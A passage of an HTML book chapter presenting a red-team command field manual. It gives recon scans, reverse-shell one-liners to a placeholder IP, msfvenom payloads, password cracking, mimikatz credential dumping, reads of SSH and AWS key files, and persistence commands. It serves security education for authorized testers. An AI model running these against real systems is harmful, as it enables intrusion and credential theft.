@@ -1,0 +1,615 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Chapter 7 — The Field Manual</title>
+<meta name="description" content="The combined Red, Blue, and Prompt field manual: full, working commands and what each one does, organized for the jobs that run them — pentester, red teamer, SOC analyst, incident responder, threat hunter, sysadmin, and the AI-augmented operator. Chapter 7 of A Hacker's Guide to Survive. For defenders and authorized testers only.">
+
+<meta property="og:type" content="article">
+<meta property="og:title" content="The Field Manual — Red, Blue & Prompt, Command by Command">
+<meta property="og:description" content="Chapter 7 of A Hacker's Guide to Survive: a combined RTFM/BTFM-style field manual of real commands and their functions for every security job, plus a Prompt Field Manual of Google-Fu search operators and prompt-engineering commands.">
+<meta property="og:image" content="https://malcolm1014.github.io/savvy-blog/book/assets/cover.svg">
+<meta property="og:url" content="https://malcolm1014.github.io/savvy-blog/book/ch07-the-field-manual/">
+<meta property="og:site_name" content="Savvy Security LLC">
+<meta property="article:author" content="Malcolm R. Smith">
+<meta property="article:section" content="Offensive &amp; Defensive Security / Reference">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="The Field Manual — Red, Blue & Prompt, Command by Command">
+<meta name="twitter:description" content="Chapter 7 of A Hacker's Guide to Survive: real commands and their functions for red team, blue team, and the prompt operator — a field manual organized by job.">
+<meta name="twitter:image" content="https://malcolm1014.github.io/savvy-blog/book/assets/cover.svg">
+
+<link rel="canonical" href="https://malcolm1014.github.io/savvy-blog/book/ch07-the-field-manual/">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Source+Serif+4:ital,wght@0,400;0,600;0,700;1,400&family=Noto+Serif:ital,wght@0,400;0,700;1,400&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+
+<style>
+  :root{
+    --bg:#f6f3ea; --fg:#1a1712; --muted:#5d5545; --rule:#ddd6c4;
+    --accent:#a86a22; --accent2:#2f6f4f; --card:#fbf8f0; --term:#166534;
+    --danger:#b23b2e;
+  }
+  @media (prefers-color-scheme: dark){
+    :root{ --bg:#11130f; --fg:#e8e5d8; --muted:#a49c87; --rule:#2c2e24; --accent:#e0a256; --accent2:#6bbd8f; --card:#191b15; --term:#4ade80; --danger:#e06b63; }
+  }
+  *{box-sizing:border-box}
+  body{
+    margin:0; background:var(--bg); color:var(--fg);
+    font-family:'Source Serif 4','Noto Serif',Georgia,'Times New Roman',serif;
+    line-height:1.68; font-size:17px;
+  }
+  .mono{font-family:'IBM Plex Mono',monospace;}
+  main{max-width:820px; margin:0 auto; padding:42px 20px 90px;}
+  .backlink{font-family:'IBM Plex Mono',monospace; font-size:.78rem;}
+  .kicker{color:var(--accent); font-weight:700; letter-spacing:.09em; font-size:.76rem; text-transform:uppercase; margin:26px 0 10px; font-family:'IBM Plex Mono',monospace;}
+  h1{font-size:2.15rem; line-height:1.18; margin:0 0 10px; font-weight:700;}
+  .dek{font-size:1.08rem; color:var(--muted); font-style:italic; margin:0 0 16px;}
+  .byline{color:var(--muted); font-size:.92rem; margin:0 0 28px; font-family:'IBM Plex Mono',monospace;}
+
+  .partnav{display:flex; flex-wrap:wrap; gap:8px; margin:0 0 34px; padding:18px 0; border-top:2px solid var(--rule); border-bottom:2px solid var(--rule);}
+  .partnav a{
+    font-family:'IBM Plex Mono',monospace; font-size:.72rem; font-weight:700; text-decoration:none;
+    color:var(--accent2); border:1px solid var(--rule); border-radius:20px; padding:6px 11px; letter-spacing:.02em;
+  }
+  .partnav a:hover{border-color:var(--accent2); background:var(--card);}
+
+  h2{font-size:1.5rem; margin:54px 0 10px; padding-bottom:10px; border-bottom:2px solid var(--accent); font-weight:700; scroll-margin-top:16px;}
+  h3{font-size:1.14rem; margin:30px 0 8px; color:var(--fg); font-weight:700;}
+  h4{font-family:'IBM Plex Mono',monospace; font-size:.8rem; text-transform:uppercase; letter-spacing:.06em; color:var(--accent); margin:22px 0 8px; font-weight:700;}
+  p{margin:0 0 15px;}
+  ul,ol{margin:0 0 16px; padding-left:23px;}
+  li{margin-bottom:6px;}
+  hr{border:none; border-top:1px solid var(--rule); margin:38px 0;}
+  strong{color:var(--fg); font-weight:700;}
+  em{color:var(--fg);}
+  a{color:var(--accent2); word-break:break-word;}
+  code{font-family:'IBM Plex Mono',monospace; font-size:.88em; background:var(--card); border:1px solid var(--rule); border-radius:3px; padding:1px 5px;}
+
+  .framing{
+    background:var(--card); border:1px solid var(--rule); border-left:4px solid var(--accent2);
+    border-radius:4px; padding:22px 24px; margin:20px 0 32px; font-size:.98rem;
+  }
+  .framing h3{margin-top:0; font-size:1rem; text-transform:uppercase; letter-spacing:.05em; font-family:'IBM Plex Mono',monospace; color:var(--accent2); font-weight:700;}
+  .framing p{margin:0 0 12px;} .framing p:last-child{margin-bottom:0;}
+
+  .danger{
+    background:var(--card); border:1px solid var(--rule); border-left:4px solid var(--danger);
+    border-radius:0 4px 4px 0; padding:18px 22px; margin:20px 0 26px;
+  }
+  .danger .tag{display:block; font-family:'IBM Plex Mono',monospace; font-size:.68rem; letter-spacing:.1em; text-transform:uppercase; color:var(--danger); font-weight:700; margin-bottom:9px;}
+  .danger p{font-size:.96rem; margin:0 0 12px;} .danger p:last-child{margin-bottom:0;}
+
+  /* ===== role badges ===== */
+  .roles{display:flex; flex-wrap:wrap; gap:6px; margin:2px 0 16px;}
+  .role{font-family:'IBM Plex Mono',monospace; font-size:.64rem; font-weight:700; letter-spacing:.05em; text-transform:uppercase; padding:3px 9px; border-radius:12px; border:1px solid var(--rule); color:var(--muted);}
+  .role.red{color:var(--danger); border-color:var(--danger);}
+  .role.blue{color:var(--accent2); border-color:var(--accent2);}
+  .role.prompt{color:var(--accent); border-color:var(--accent);}
+
+  /* ===== command reference (command -> function) ===== */
+  dl.fm{margin:4px 0 20px; border-top:1px solid var(--rule);}
+  dl.fm > div{display:grid; grid-template-columns:minmax(0,0.95fr) minmax(0,1.05fr); gap:3px 20px; padding:9px 2px; border-bottom:1px solid var(--rule);}
+  dl.fm dt{font-family:'IBM Plex Mono',monospace; font-size:.8rem; color:var(--term); font-weight:600; white-space:pre-wrap; word-break:break-word; margin:0; line-height:1.5;}
+  dl.fm dd{margin:0; font-size:.92rem; color:var(--muted); line-height:1.55;}
+  dl.fm dd b{color:var(--fg); font-weight:700;}
+  @media (max-width:660px){ dl.fm > div{grid-template-columns:1fr; gap:4px;} dl.fm dt{color:var(--term);} }
+
+  /* ===== jobs map ===== */
+  table.jobs{width:100%; border-collapse:collapse; font-size:.9rem; margin:14px 0 24px;}
+  table.jobs th,table.jobs td{text-align:left; padding:9px 10px; border-bottom:1px solid var(--rule); vertical-align:top;}
+  table.jobs th{font-family:'IBM Plex Mono',monospace; font-size:.68rem; text-transform:uppercase; letter-spacing:.06em; color:var(--accent2); font-weight:700;}
+  table.jobs td:first-child{font-weight:700;}
+  table.jobs .side{font-family:'IBM Plex Mono',monospace; font-size:.68rem; font-weight:700;}
+
+  .note{background:var(--card); border:1px solid var(--rule); border-radius:4px; padding:18px 22px; margin:22px 0 24px; font-size:.92rem; color:var(--muted);}
+  .note p{margin:0 0 10px;} .note p:last-child{margin-bottom:0;}
+  .note strong{color:var(--fg);}
+
+  .lessons{background:var(--card); border:1px solid var(--rule); border-left:4px solid var(--accent); border-radius:0 4px 4px 0; padding:18px 22px; margin:22px 0 26px;}
+  .lessons h3{margin-top:0; font-size:1rem; text-transform:uppercase; letter-spacing:.05em; font-family:'IBM Plex Mono',monospace; color:var(--accent); font-weight:700;}
+
+  .refs{font-size:.85rem; color:var(--muted); padding-left:20px;}
+  .refs li{margin-bottom:7px;}
+  .refs-group{font-family:'IBM Plex Mono',monospace; font-size:.7rem; letter-spacing:.08em; text-transform:uppercase; color:var(--accent2); font-weight:700; margin:22px 0 8px;}
+
+  .chapnav{display:flex; justify-content:space-between; gap:12px; margin:40px 0 0; padding-top:22px; border-top:2px solid var(--rule); font-family:'IBM Plex Mono',monospace; font-size:.8rem;}
+  .chapnav a{text-decoration:none; color:var(--accent2);}
+
+  .signoff{font-style:italic; color:var(--muted); margin-top:36px;}
+  footer{color:var(--muted); font-size:.85rem; text-align:center; padding:24px 20px 40px; font-family:'IBM Plex Mono',monospace; letter-spacing:.05em; text-transform:uppercase;}
+</style>
+</head>
+<body>
+<main>
+  <p class="backlink"><a href="../">&larr; Table of contents</a> &middot; <a href="../../">All articles</a></p>
+  <p class="kicker">A Hacker&rsquo;s Guide to Survive &middot; Chapter Seven</p>
+  <h1>The Field Manual</h1>
+  <p class="dek">Red, blue, and prompt &mdash; the commands themselves, and what each one does. The reference you keep open in the other pane while you work, written for the jobs that actually run these lines.</p>
+  <p class="byline">By Malcolm R. Smith &mdash; Savvy Security LLC &middot; Edition One &middot; 2026</p>
+
+  <nav class="partnav mono">
+    <a href="#part1">I &middot; Setup</a>
+    <a href="#part2">II &middot; Recon (Red)</a>
+    <a href="#part3">III &middot; Exploit (Red)</a>
+    <a href="#part4">IV &middot; Post-Exploit (Red)</a>
+    <a href="#part5">V &middot; Triage (Blue)</a>
+    <a href="#part6">VI &middot; Hunting (Blue)</a>
+    <a href="#part7">VII &middot; Net &amp; Forensics (Blue)</a>
+    <a href="#part8">VIII &middot; Prompt Field Manual</a>
+    <a href="#part9">IX &middot; The Jobs</a>
+    <a href="#sources">Sources</a>
+  </nav>
+
+  <div class="framing">
+    <h3>What this chapter is, and the one rule that governs it</h3>
+    <p>Chapter 6 told you what the attacks <em>are</em>. This chapter hands you the keyboard. It is the working half of the book &mdash; a field manual in the tradition of the two little books every operator carries dog-eared: Ben Clark&rsquo;s <em>Red Team Field Manual</em> (RTFM) and Alan White and Clark&rsquo;s <em>Blue Team Field Manual</em> (BTFM). I have combined them, because the wall between red and blue is mostly a job-title fiction: the same command that an attacker runs to enumerate a host is the one a defender runs to see what the attacker found, and you will do far better work if you can think from both chairs. To those two I have added a third manual that did not exist when the others were written &mdash; the <strong>Prompt Field Manual</strong>, the search operators and prompt-engineering commands that are now as fundamental to this craft as <code>grep</code> and <code>nmap</code>.</p>
+    <p>Every entry gives the command and, beside it, <strong>what it does</strong> &mdash; because a command you can copy but cannot explain is a liability, not a skill. This is a reference, not a tutorial; it assumes you read Chapters 1&ndash;6 and will look up the flags your situation needs. It is deliberately tighter than the chapters around it. A field manual earns its place by being dense, correct, and fast to scan &mdash; not by being long.</p>
+    <p>And it all sits behind the single rule of this book, which matters more here than anywhere else, because here the words are executable:</p>
+    <p><strong>Every command in this chapter is for systems you own or are explicitly authorized in writing to test and defend. The red-side commands run against your own lab (Chapter 5) or a client who signed a scope. Run them anywhere else and you are not a hacker, you are a defendant &mdash; the Computer Fraud and Abuse Act is Chapter 10&rsquo;s subject. The commands are neutral. The authorization is everything.</strong></p>
+  </div>
+
+  <p>A note on how to read the tables below. The left column is the command &mdash; copy it, swap the obvious placeholders (<code>TARGET</code>, <code>IP</code>, <code>FILE</code>, <code>USER</code>, <code>10.10.10.10</code>), and run it. The right column is its function in plain English. Role badges at the head of each part tell you whose job it usually is, but read all of them: the best defenders learned offense, and the best attackers learned what the logs would show.</p>
+
+  <!-- ===================== PART I ===================== -->
+  <h2 id="part1">Part I &mdash; The Operator&rsquo;s Setup</h2>
+  <div class="roles"><span class="role red">Red</span><span class="role blue">Blue</span><span class="role prompt">Everyone</span></div>
+  <p>Before the first scan, settle your environment. A messy terminal loses work; an un-upgraded shell gets you caught or stuck. This is the ground every other part stands on &mdash; and it runs in the Hetzner lab you built in Chapter 5.</p>
+
+  <h4>tmux &mdash; never lose a session</h4>
+  <dl class="fm">
+    <div><dt>tmux new -s op</dt><dd>Start a <b>named</b> session (<code>op</code>) that survives a dropped SSH connection &mdash; your long scans keep running.</dd></div>
+    <div><dt>tmux a -t op</dt><dd>Re-attach to the <code>op</code> session after you reconnect.</dd></div>
+    <div><dt>tmux ls</dt><dd>List all running sessions.</dd></div>
+    <div><dt>Ctrl-b d</dt><dd>Detach from the current session, leaving it running in the background.</dd></div>
+    <div><dt>Ctrl-b "  /  Ctrl-b %</dt><dd>Split the window into panes &mdash; horizontal / vertical. Watch a scan in one, take notes in another.</dd></div>
+    <div><dt>Ctrl-b c  /  Ctrl-b n</dt><dd>Create a new window / move to the next &mdash; one window per target.</dd></div>
+  </dl>
+
+  <h4>Shells &amp; the first upgrade</h4>
+  <dl class="fm">
+    <div><dt>python3 -c 'import pty;pty.spawn("/bin/bash")'</dt><dd>Upgrade a dumb reverse shell into a real interactive TTY &mdash; the first thing you do after a callback (see Part III).</dd></div>
+    <div><dt>export TERM=xterm; stty rows 50 cols 200</dt><dd>Fix terminal size and type so <code>clear</code>, editors, and arrow keys work in the upgraded shell.</dd></div>
+    <div><dt>ssh USER@IP -p 22</dt><dd>Open a remote shell over SSH &mdash; the backbone of remote work and pivoting.</dd></div>
+    <div><dt>ssh-keygen -t ed25519 -C "op"</dt><dd>Generate a modern SSH key pair for passwordless, auditable access.</dd></div>
+    <div><dt>history -c  /  unset HISTFILE</dt><dd><b>Blue note:</b> attackers clear history with these &mdash; so defenders ship shell history off-box and alert on its truncation.</dd></div>
+  </dl>
+
+  <!-- ===================== PART II ===================== -->
+  <h2 id="part2">Part II &mdash; Reconnaissance &amp; Enumeration (Red)</h2>
+  <div class="roles"><span class="role red">Pentester</span><span class="role red">Red Teamer</span><span class="role red">Bug Bounty</span><span class="role blue">Blue (read these to know your own footprint)</span></div>
+  <p>Enumeration is 80% of offense. You cannot exploit what you have not mapped. This is the recon of Chapter 6&rsquo;s Parts II&ndash;III made executable &mdash; find the hosts, the ports, the names, the shares, the directory.</p>
+
+  <h4>Host discovery &amp; port scanning</h4>
+  <dl class="fm">
+    <div><dt>nmap -sn 10.10.10.0/24</dt><dd>Ping-sweep a subnet &mdash; list which hosts are alive, no port scan.</dd></div>
+    <div><dt>nmap -sC -sV -O -oA scan TARGET</dt><dd>The workhorse: default <b>scripts</b> (<code>-sC</code>), service/<b>version</b> detection (<code>-sV</code>), <b>OS</b> guess (<code>-O</code>), save all formats (<code>-oA</code>).</dd></div>
+    <div><dt>nmap -p- --min-rate 5000 TARGET</dt><dd>Scan <b>all 65,535 ports</b> fast &mdash; never trust a top-1000 scan to be complete.</dd></div>
+    <div><dt>nmap -sU --top-ports 100 TARGET</dt><dd>Scan the 100 most common <b>UDP</b> ports (DNS, SNMP, IKE) &mdash; the ports TCP scans miss.</dd></div>
+    <div><dt>nmap -sV --script vuln TARGET</dt><dd>Run NSE vulnerability-detection scripts against discovered services.</dd></div>
+    <div><dt>masscan -p1-65535 10.0.0.0/8 --rate 10000</dt><dd>Internet-scale SYN scanner &mdash; find open ports across huge ranges, then hand the hits to nmap for detail.</dd></div>
+    <div><dt>rustscan -a TARGET -- -sC -sV</dt><dd>Scan all ports in seconds, then auto-pipe the open ones into nmap for deep inspection.</dd></div>
+  </dl>
+
+  <h4>DNS &amp; subdomain discovery</h4>
+  <dl class="fm">
+    <div><dt>dig TARGET any +noall +answer</dt><dd>Query all common DNS records for a domain in one shot.</dd></div>
+    <div><dt>dig axfr @NS TARGET</dt><dd>Attempt a <b>zone transfer</b> &mdash; a misconfigured name server hands you the entire internal map.</dd></div>
+    <div><dt>host -t mx TARGET  /  host -t txt TARGET</dt><dd>Pull mail (MX) and TXT records &mdash; SPF/DMARC and third-party services leak the attack surface.</dd></div>
+    <div><dt>subfinder -d TARGET -all -silent</dt><dd>Passive subdomain enumeration from dozens of sources &mdash; the modern first move.</dd></div>
+    <div><dt>amass enum -passive -d TARGET</dt><dd>Deep, aggregated subdomain and infrastructure mapping (OWASP Amass).</dd></div>
+    <div><dt>dnsrecon -d TARGET -t std</dt><dd>Standard DNS enumeration &mdash; records, zone transfer test, and common subdomain brute force.</dd></div>
+    <div><dt>dnsx -l subs.txt -resp -a</dt><dd>Resolve a list of candidate subdomains to live A records, fast.</dd></div>
+  </dl>
+
+  <h4>Web enumeration</h4>
+  <dl class="fm">
+    <div><dt>whatweb TARGET  /  nmap --script http-enum</dt><dd>Fingerprint the web stack &mdash; server, CMS, frameworks, versions.</dd></div>
+    <div><dt>curl -sI https://TARGET</dt><dd>Fetch headers only &mdash; server banner, security headers, redirects, cookies at a glance.</dd></div>
+    <div><dt>gobuster dir -u URL -w WORDLIST -x php,txt,html</dt><dd>Brute-force hidden directories and files by extension.</dd></div>
+    <div><dt>ffuf -w WORDLIST -u https://TARGET/FUZZ -mc 200,301</dt><dd>Fast web fuzzer &mdash; <code>FUZZ</code> is the injection point; filter by status/size. Also fuzzes params and vhosts.</dd></div>
+    <div><dt>ffuf -w subs.txt -u https://TARGET -H "Host: FUZZ.TARGET"</dt><dd>Virtual-host discovery &mdash; find sites that only answer to the right <code>Host:</code> header.</dd></div>
+    <div><dt>feroxbuster -u URL -w WORDLIST</dt><dd>Recursive content discovery &mdash; walks into every directory it finds.</dd></div>
+    <div><dt>nikto -h URL</dt><dd>Classic web-server scanner &mdash; known bad files, outdated software, misconfigurations.</dd></div>
+    <div><dt>wpscan --url URL --enumerate u,vp</dt><dd>WordPress-specific: enumerate <b>u</b>sers and <b>v</b>ulnerable <b>p</b>lugins.</dd></div>
+  </dl>
+
+  <h4>SMB, RPC &amp; Active Directory</h4>
+  <dl class="fm">
+    <div><dt>smbclient -L //IP -N</dt><dd>List SMB shares with a <b>null</b> (unauthenticated) session &mdash; a classic open door.</dd></div>
+    <div><dt>enum4linux-ng -A IP</dt><dd>All-in-one SMB/RPC enumeration &mdash; users, groups, shares, password policy, OS.</dd></div>
+    <div><dt>rpcclient -U "" -N IP</dt><dd>Null-session RPC shell &mdash; then <code>enumdomusers</code>, <code>querydominfo</code> to pull the domain.</dd></div>
+    <div><dt>crackmapexec smb 10.10.10.0/24</dt><dd>Sweep a subnet for SMB hosts, signing status, and null/guest access &mdash; the AD recon Swiss-army knife (now also <b>NetExec</b>, <code>nxc</code>).</dd></div>
+    <div><dt>ldapsearch -x -H ldap://IP -b "dc=corp,dc=local"</dt><dd>Query LDAP anonymously &mdash; dump the directory tree, users, and attributes.</dd></div>
+    <div><dt>kerbrute userenum -d corp.local users.txt</dt><dd>Validate usernames against Kerberos with no lockout noise &mdash; builds your target list.</dd></div>
+    <div><dt>GetUserSPNs.py corp.local/user -request</dt><dd><b>Kerberoasting</b> (Impacket): request service tickets you can crack offline (Ch. 6, Part VIII).</dd></div>
+    <div><dt>bloodhound-python -d corp.local -u USER -p PASS -c all</dt><dd>Collect every AD relationship into BloodHound to graph the shortest path to Domain Admin.</dd></div>
+  </dl>
+
+  <!-- ===================== PART III ===================== -->
+  <h2 id="part3">Part III &mdash; Exploitation &amp; Password Attacks (Red)</h2>
+  <div class="roles"><span class="role red">Pentester</span><span class="role red">Red Teamer</span><span class="role red">Exploit Dev</span><span class="role blue">Blue (recognize the artifacts these leave)</span></div>
+  <p>Enumeration found the way in; this turns it. Get a shell, catch the callback, attack the login, move the files. These map to Chapter 6&rsquo;s Parts V&ndash;VIII.</p>
+
+  <h4>Listeners &amp; reverse shells</h4>
+  <dl class="fm">
+    <div><dt>nc -lvnp 4444</dt><dd>Start a Netcat <b>listener</b> on port 4444 to catch an incoming reverse shell.</dd></div>
+    <div><dt>rlwrap nc -lvnp 4444</dt><dd>Same, wrapped so arrow keys and history work in the caught shell.</dd></div>
+    <div><dt>bash -i &gt;&amp; /dev/tcp/IP/4444 0&gt;&amp;1</dt><dd>The canonical Linux <b>reverse shell</b> &mdash; connects the target&rsquo;s bash back to your listener.</dd></div>
+    <div><dt>python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("IP",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'</dt><dd>Python reverse shell &mdash; works where bash <code>/dev/tcp</code> is unavailable.</dd></div>
+    <div><dt>powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('IP',4444);..."</dt><dd>Windows reverse shell &mdash; the PowerShell one-liner pattern (full form from msfvenom below).</dd></div>
+    <div><dt>socat TCP:IP:4444 EXEC:/bin/bash,pty,stderr</dt><dd>A <b>fully interactive</b> reverse shell with a real PTY &mdash; the upgrade over raw netcat.</dd></div>
+  </dl>
+
+  <h4>Metasploit &amp; payload generation</h4>
+  <dl class="fm">
+    <div><dt>msfconsole -q</dt><dd>Launch the Metasploit Framework quietly &mdash; the exploitation platform (Ch. 2&rsquo;s HD Moore).</dd></div>
+    <div><dt>search TYPE:exploit NAME  /  use PATH  /  info</dt><dd>Find a module, select it, read what it needs.</dd></div>
+    <div><dt>set RHOSTS IP; set LHOST me; set LPORT 4444; run</dt><dd>Point a module at the target and your handler, then fire it.</dd></div>
+    <div><dt>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf -o s.elf</dt><dd>Generate a standalone <b>payload</b> binary for Linux.</dd></div>
+    <div><dt>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o s.exe</dt><dd>Generate a Windows Meterpreter payload &mdash; the full-featured post-exploitation agent.</dd></div>
+    <div><dt>use exploit/multi/handler</dt><dd>Catch a payload you deployed by other means &mdash; set the same payload/LHOST/LPORT and <code>run</code>.</dd></div>
+  </dl>
+
+  <h4>Web exploitation</h4>
+  <dl class="fm">
+    <div><dt>sqlmap -u "URL?id=1" --batch --dbs</dt><dd>Automated <b>SQL injection</b> (Ch. 6, Part V) &mdash; confirm the flaw and enumerate databases.</dd></div>
+    <div><dt>sqlmap -r req.txt --dump -T users</dt><dd>Replay a saved request and dump a table &mdash; <code>req.txt</code> is a captured HTTP request.</dd></div>
+    <div><dt>curl "URL?file=../../../../etc/passwd"</dt><dd>Test <b>path traversal / LFI</b> by hand &mdash; the simplest proof of a file-read flaw.</dd></div>
+    <div><dt>ffuf -w params.txt -u "URL?FUZZ=test" -fs 0</dt><dd>Discover hidden <b>parameters</b> by filtering out the empty-response size.</dd></div>
+    <div><dt>commix -u "URL?q=1"</dt><dd>Automated OS <b>command-injection</b> testing and exploitation.</dd></div>
+  </dl>
+
+  <h4>Password &amp; hash attacks</h4>
+  <dl class="fm">
+    <div><dt>hydra -L users.txt -P pass.txt ssh://IP</dt><dd>Online <b>brute force / spray</b> against a live service (SSH, FTP, RDP, HTTP forms).</dd></div>
+    <div><dt>hydra -l USER -P rockyou.txt IP http-post-form "/login:user=^USER^&amp;pass=^PASS^:Invalid"</dt><dd>Attack a web login form &mdash; <code>^USER^/^PASS^</code> are injected; the trailing string marks failure.</dd></div>
+    <div><dt>hashid HASH  /  hash-identifier</dt><dd>Identify an unknown hash type before you try to crack it.</dd></div>
+    <div><dt>john --wordlist=rockyou.txt hashes.txt</dt><dd>John the Ripper &mdash; crack a hash file against a wordlist; auto-detects many formats.</dd></div>
+    <div><dt>hashcat -m 1000 -a 0 ntlm.txt rockyou.txt</dt><dd>GPU cracking &mdash; <code>-m 1000</code> is NTLM, <code>-a 0</code> is wordlist mode; the fastest cracker there is.</dd></div>
+    <div><dt>hashcat -m 1000 -a 3 ntlm.txt ?u?l?l?l?l?d?d</dt><dd>Mask/brute mode &mdash; try every pattern of upper, lower, and digits (Ch. 6, Part VIII).</dd></div>
+  </dl>
+
+  <h4>File transfer (getting your tools across)</h4>
+  <dl class="fm">
+    <div><dt>python3 -m http.server 8000</dt><dd>Serve the current directory over HTTP &mdash; the universal way to move tools to a target.</dd></div>
+    <div><dt>wget http://IP:8000/linpeas.sh  /  curl -O http://IP:8000/t</dt><dd>Pull a file from your server onto the target.</dd></div>
+    <div><dt>certutil -urlcache -f http://IP/s.exe s.exe</dt><dd>The Windows equivalent &mdash; download a file with a built-in binary (a known LOLBin).</dd></div>
+    <div><dt>impacket-smbserver share . -smb2support</dt><dd>Stand up an SMB share so Windows targets can <code>copy \\IP\share\tool.exe</code>.</dd></div>
+    <div><dt>scp FILE USER@IP:/tmp/</dt><dd>Copy a file over SSH when you already have credentials.</dd></div>
+  </dl>
+
+  <!-- ===================== PART IV ===================== -->
+  <h2 id="part4">Part IV &mdash; Post-Exploitation, PrivEsc &amp; Pivoting (Red)</h2>
+  <div class="roles"><span class="role red">Red Teamer</span><span class="role red">Pentester</span><span class="role blue">Blue (every line here is a detection opportunity)</span></div>
+  <p>You have a shell. Now: who are you, how do you become root or SYSTEM, how do you reach the next box, and how do you survive a reboot? Chapter 6&rsquo;s Parts IX&ndash;XI, at the keyboard.</p>
+
+  <h4>Linux local enumeration &amp; privilege escalation</h4>
+  <dl class="fm">
+    <div><dt>id; whoami; sudo -l</dt><dd>Who am I, what groups, and <b>what can I run as root</b> &mdash; <code>sudo -l</code> is the single highest-value check (see GTFOBins).</dd></div>
+    <div><dt>uname -a; cat /etc/os-release</dt><dd>Kernel and distro version &mdash; the input to a kernel-exploit search (Ch. 6, Part IX).</dd></div>
+    <div><dt>find / -perm -4000 -type f 2&gt;/dev/null</dt><dd>Find all <b>SUID</b> binaries &mdash; any unexpected one on GTFOBins is a root path.</dd></div>
+    <div><dt>getcap -r / 2&gt;/dev/null</dt><dd>List file <b>capabilities</b> &mdash; <code>cap_setuid</code> on python or perl is game over.</dd></div>
+    <div><dt>cat /etc/crontab; ls -la /etc/cron.*</dt><dd>Find scheduled jobs &mdash; a writable script run by root is a clean escalation.</dd></div>
+    <div><dt>./linpeas.sh | tee linpeas.out</dt><dd>Run PEASS-ng&rsquo;s LinPEAS &mdash; automated enumeration that color-codes every privesc lead.</dd></div>
+  </dl>
+
+  <h4>Windows local enumeration &amp; privilege escalation</h4>
+  <dl class="fm">
+    <div><dt>whoami /priv; whoami /groups</dt><dd>List your <b>privileges</b> and groups &mdash; <code>SeImpersonate</code> means a Potato attack to SYSTEM.</dd></div>
+    <div><dt>systeminfo</dt><dd>OS build and installed hotfixes &mdash; feed it to a patch-gap tool to find missing KBs.</dd></div>
+    <div><dt>net user; net localgroup administrators</dt><dd>Enumerate accounts and who holds local admin.</dd></div>
+    <div><dt>.\winPEASany.exe</dt><dd>WinPEAS &mdash; the Windows automated privesc enumerator.</dd></div>
+    <div><dt>powershell -ep bypass; . .\PowerUp.ps1; Invoke-AllChecks</dt><dd>PowerSploit&rsquo;s PowerUp &mdash; finds unquoted service paths, weak permissions, and auto-logon creds.</dd></div>
+    <div><dt>schtasks /query /fo LIST /v</dt><dd>List scheduled tasks &mdash; a writable task action is persistence and escalation at once.</dd></div>
+  </dl>
+
+  <h4>Credential access</h4>
+  <dl class="fm">
+    <div><dt>mimikatz # sekurlsa::logonpasswords</dt><dd>Dump plaintext passwords, hashes, and Kerberos tickets from LSASS memory (Ch. 6, Part VIII).</dd></div>
+    <div><dt>secretsdump.py corp/USER@IP</dt><dd>Impacket &mdash; remotely dump SAM/LSA secrets and, with the right rights, the whole domain via DCSync.</dd></div>
+    <div><dt>reg save HKLM\SAM sam.hive; reg save HKLM\SYSTEM sys.hive</dt><dd>Export the SAM and SYSTEM hives to crack local hashes offline.</dd></div>
+    <div><dt>cat ~/.bash_history ~/.ssh/id_rsa .aws/credentials</dt><dd>The quiet win &mdash; secrets left in files beat any exploit.</dd></div>
+  </dl>
+
+  <h4>Lateral movement</h4>
+  <dl class="fm">
+    <div><dt>psexec.py corp/USER@IP  /  wmiexec.py ...</dt><dd>Impacket &mdash; get a shell on a remote Windows host over SMB/WMI with creds or a hash.</dd></div>
+    <div><dt>evil-winrm -i IP -u USER -p PASS</dt><dd>A full interactive shell over WinRM (port 5985) &mdash; the cleanest modern remoting.</dd></div>
+    <div><dt>crackmapexec smb 10.10.10.0/24 -u USER -H HASH</dt><dd><b>Pass-the-hash</b> across a subnet &mdash; spray one NTLM hash to find where it is admin.</dd></div>
+    <div><dt>ssh -o StrictHostKeyChecking=no USER@NEXT</dt><dd>Pivot by hand when you have reused credentials or a planted key.</dd></div>
+  </dl>
+
+  <h4>Pivoting &amp; tunneling</h4>
+  <dl class="fm">
+    <div><dt>ssh -L 8080:INTERNAL:80 USER@PIVOT</dt><dd><b>Local</b> port forward &mdash; reach an internal service through a box you control.</dd></div>
+    <div><dt>ssh -D 1080 USER@PIVOT</dt><dd>Open a <b>SOCKS</b> proxy &mdash; tunnel any tool into the internal network.</dd></div>
+    <div><dt>proxychains nmap -sT INTERNAL</dt><dd>Force a tool through that SOCKS proxy to scan the far side of the pivot.</dd></div>
+    <div><dt>chisel server -p 8000 --reverse  /  chisel client IP:8000 R:socks</dt><dd>Build a reverse SOCKS tunnel out through a firewall that only allows outbound.</dd></div>
+  </dl>
+
+  <h4>Persistence (test, then document and remove)</h4>
+  <dl class="fm">
+    <div><dt>(crontab -l; echo "* * * * * CMD") | crontab -</dt><dd>Add a cron job that re-launches a callback &mdash; the classic Linux persistence.</dd></div>
+    <div><dt>echo "KEY" &gt;&gt; ~/.ssh/authorized_keys</dt><dd>Drop your public key for passwordless re-entry.</dd></div>
+    <div><dt>reg add HKCU\...\Run /v X /t REG_SZ /d "CMD"</dt><dd>Windows Run-key persistence &mdash; runs your command at every logon (Ch. 6, Part X).</dd></div>
+    <div><dt>schtasks /create /tn X /tr "CMD" /sc onlogon</dt><dd>Scheduled-task persistence triggered on logon.</dd></div>
+  </dl>
+
+  <div class="danger">
+    <span class="tag">Operator discipline</span>
+    <p>On an authorized engagement, everything in Part IV is <strong>logged by you</strong> as you do it: what you changed, where, and when. Persistence you plant, you remove &mdash; and you hand the client the exact commands to verify it is gone. The difference between a red teamer and an intruder is not the command. It is the report, the cleanup, and the signature on the scope.</p>
+  </div>
+
+  <!-- ===================== PART V ===================== -->
+  <h2 id="part5">Part V &mdash; Triage &amp; Live Response (Blue)</h2>
